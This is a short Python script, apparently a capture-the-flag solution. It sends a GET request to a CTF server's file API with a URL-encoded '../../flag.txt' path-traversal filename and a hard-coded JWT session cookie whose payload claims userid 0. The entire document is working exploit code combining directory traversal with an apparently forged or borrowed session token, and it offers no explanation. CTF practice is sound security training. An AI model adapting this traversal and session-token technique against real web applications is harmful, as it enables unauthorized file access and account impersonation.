import requests

url = 'http://ctf.asgama.online:40004/api/file'
params = {
    'filename': '%2e%2e%2f%2e%2e%2fflag.txt'
}
cookies = {
    'session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOjB9.ChYDxeT-Rdfnz4gaOmqQ_P_0WVPGgJw9TvUa-OY7TeM'
}

r = requests.get(url, params=params, cookies=cookies)

print(f"Status: {r.status_code}")
print("Response:")
print(r.text)
